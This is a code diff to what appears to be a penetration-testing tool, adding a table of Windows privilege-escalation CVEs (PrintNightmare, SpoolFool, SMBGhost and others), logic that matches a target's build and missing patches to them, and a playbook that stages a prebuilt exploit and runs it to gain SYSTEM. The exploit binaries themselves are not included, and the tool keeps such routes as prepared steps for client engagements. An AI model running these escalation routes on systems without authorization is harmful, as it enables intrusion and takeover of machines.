@@ -581,6 +581,132 @@ def _d_kernel_lpe(facts, ctx):
                 restore=f"rm -f {remote}"))
 
 
+# ---------------------------------------------- Windows local kernel/service CVEs
+
+#: Windows LPE PoCs matched to `facts.win_build` + `facts.hotfixes`. Same shape as
+#: :data:`KERNEL_LPE` for the Linux side: each rule names a build window, the KBs
+#: that fix it (if the target has ANY listed fix installed, the rule doesn't fire —
+#: fewer false positives than a build-only match), the arsenal artifact, and the
+#: three ranking axes. All are *prepared* routes (Playbook), never auto-fired —
+#: kernel LPEs against a client host are ranked + explained; `fieldkit prep`
+#: renders the steps.
+#:
+#: (key, cve, artifact, build_lo, build_hi, fixed_kbs, exploitability, safety,
+#:  detection, title, note)
+WIN_LPE = (
+    dict(key="printnightmare", cve="CVE-2021-34527", artifact="printnightmare",
+         build_lo="10.0.0.0", build_hi="10.0.19043.9999",
+         fixed_kbs=("KB5005010", "KB5005033", "KB5005565", "KB5005568", "KB5005566"),
+         exploitability="high", safety="config-change", detection="loud",
+         title="Print Spooler RCE (PrintNightmare) → SYSTEM",
+         note="Invoke-Nightmare.ps1 is a READY PowerShell PoC (arsenal: win-kernel/"
+              "printnightmare, no build). Needs Print Spooler enabled and the pre-patch "
+              "state — the July 2021 out-of-band KB series fixes it."),
+    dict(key="spoolfool", cve="CVE-2022-21999", artifact="SpoolFool",
+         build_lo="10.0.0.0", build_hi="10.0.19045.9999",
+         fixed_kbs=("KB5010342", "KB5010354", "KB5010351"),
+         exploitability="high", safety="config-change", detection="moderate",
+         title="Spooler service directory abuse (SpoolFool) → SYSTEM",
+         note="Follow-on to PrintNightmare — abuses SpoolDirectory in the printer "
+              "config. February 2022 Patch Tuesday and later KBs fix it."),
+    dict(key="smbghost-2020-0796", cve="CVE-2020-0796", artifact="smbghost-2020-0796",
+         build_lo="10.0.18362.0", build_hi="10.0.18363.9999",
+         fixed_kbs=("KB4551762",),
+         exploitability="medium", safety="crash-risk", detection="loud",
+         title="SMBv3 compression overflow (SMBGhost) local LPE → SYSTEM",
+         note="Only affects Windows 10 1903 and 1909 (build 18362 / 18363). Kernel "
+              "corruption — a failed attempt CAN BSOD. There's a READY static .exe in "
+              "the arsenal (win-kernel/smbghost-2020-0796) — no build needed."),
+    dict(key="afd-2023-21768", cve="CVE-2023-21768", artifact="afd-2023-21768",
+         build_lo="10.0.22000.0", build_hi="10.0.22623.9999",
+         fixed_kbs=("KB5022303", "KB5022287", "KB5022834", "KB5022836"),
+         exploitability="high", safety="crash-risk", detection="moderate",
+         title="afd.sys AFDGetCcAsyncKey LPE → SYSTEM",
+         note="Windows 11 21H2 / 22H2 and Server 2022. Kernel r/w primitive; failed "
+              "exploitation can BSOD. January 2023 Patch Tuesday fixes."),
+    dict(key="win32k-2021-1732", cve="CVE-2021-1732", artifact="win32k-2021-1732",
+         build_lo="10.0.19041.0", build_hi="10.0.19042.9999",
+         fixed_kbs=("KB4601319", "KB4601315"),
+         exploitability="high", safety="crash-risk", detection="loud",
+         title="win32k NtUserCreateWindowEx type confusion → SYSTEM",
+         note="Windows 10 2004 / 20H2. Bitmap type-confusion kernel corruption; can "
+              "BSOD. Patched by February 2021 Cumulative."),
+)
+
+
+def _build_tuple(build):
+    """(10, 0, 19045, 0) etc. Right-pads to a fixed length so comparisons are total."""
+    if not build:
+        return None
+    parts = build.split(".")
+    try:
+        vals = [int(p) for p in parts]
+    except ValueError:
+        return None
+    while len(vals) < 4:
+        vals.append(0)
+    return tuple(vals[:4])
+
+
+def _build_in_range(build, lo, hi):
+    v = _build_tuple(build)
+    if v is None:
+        return False
+    if lo and v < _build_tuple(lo):
+        return False
+    if hi and v > _build_tuple(hi):
+        return False
+    return True
+
+
+def win_lpe_candidates(facts):
+    """The :data:`WIN_LPE` rules the facts justify. Yields ``(rule, evidence)``.
+
+    A rule fires when the OS build is in-range AND none of its fixing KBs are
+    installed. An unknown build never matches (the matcher does not guess).
+    """
+    for rule in WIN_LPE:
+        if not _build_in_range(facts.win_build, rule["build_lo"], rule["build_hi"]):
+            continue
+        installed_fix = set(rule["fixed_kbs"]) & set(facts.hotfixes)
+        if installed_fix:
+            continue                                    # target has the fix — skip
+        why = f"build {facts.win_build} in {rule['build_lo']}–{rule['build_hi']}"
+        if not facts.hotfixes:
+            why += " (no hotfix list captured — build match only)"
+        yield rule, why
+
+
+def _d_win_lpe(facts, ctx):
+    """Match captured Windows OS build + hotfixes to the staged win-kernel PoCs."""
+    for rule, evidence in win_lpe_candidates(facts):
+        remote = f"{ctx.stage_win}\\{rule['key']}.exe"
+        yield Vector(
+            key=f"wincve:{rule['key']}", title=f"{rule['cve']} — {rule['title']}",
+            exploitability=rule["exploitability"], safety=rule["safety"],
+            detection=rule["detection"],
+            command=f"{remote} && whoami", shell="cmd", host=ctx.host,
+            detail=(f"{rule['note']} PoC: `{rule['artifact']}` (arsenal: "
+                    "win-kernel)."),
+            evidence=evidence,
+            safe_proof="the PoC runs `whoami` in the SYSTEM context; nothing else touched.",
+            cleanup=f"del {remote}", report_type="kernel_cve",
+            stages=((rule["artifact"], remote),),
+            playbook=Playbook(
+                summary=(f"{rule['cve']} matched on {evidence}. Prepared rather than "
+                         f"auto-fired: this is a {rule['safety']} route against a client "
+                         "host — a failed kernel exploit CAN BSOD."),
+                place=remote,
+                steps=(
+                    f"stage the arsenal copy of `{rule['artifact']}` to {remote} "
+                    f"(`fieldkit prep {ctx.host} wincve:{rule['key']} --stage`)",
+                    "confirm the exact target build + KB set is still what enum recorded "
+                    "(patch state may have changed since)",
+                    f"run `{remote}` and capture `whoami` proving nt authority\\system",
+                ),
+                restore=f"del {remote}"))
+
+
 def _d_sudo_env(facts, ctx):
     preload = facts.sudo_env_keep & {"LD_PRELOAD", "LD_LIBRARY_PATH"}
     if not preload:
@@ -764,7 +890,7 @@ DRIVERS = {
     LINUX: (_d_sudo_all, _d_sudo_gtfo, _d_suid_gtfo, _d_caps, _d_docker_group, _d_sudo_env,
             _d_kernel_lpe),
     WINDOWS: (_d_win_privs, _d_win_aie, _d_win_unquoted, _d_win_weak_service,
-              _d_win_writable_service, _d_win_dll_hijack),
+              _d_win_writable_service, _d_win_dll_hijack, _d_win_lpe),
 }
 
 
